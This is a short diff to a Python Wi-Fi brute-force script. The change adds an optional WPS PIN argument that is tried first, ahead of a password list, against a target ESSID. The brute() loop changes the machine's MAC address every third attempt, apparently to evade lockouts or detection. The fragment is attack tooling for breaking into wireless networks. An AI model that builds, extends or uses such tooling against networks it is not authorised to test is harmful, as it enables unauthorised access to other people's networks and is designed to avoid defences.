@@ -8,6 +8,7 @@ WLAN = argv[1]
 ESSID = argv[2]
 DEFAULT_PASSWORD = argv[3]
 PATH = argv[4]
+WPSPIN = int(argv[5])
 MSG = ('negotiation completed', 'Handshake failed')
 RED = '\033[31m'
 GREEN = '\033[32m'
@@ -65,6 +66,8 @@ def popen(cmd: list, secret: str) -> str:
 def brute() -> None:
     print(f'Current AP: {BACKGROUND}{ESSID}{COLOUR}')
     passwords: list = get_passwords()
+    if WPSPIN:
+        passwords.insert(0, WPSPIN)
     for password in passwords:
         if passwords.index(password) % 3 == 0:
             change_mac()
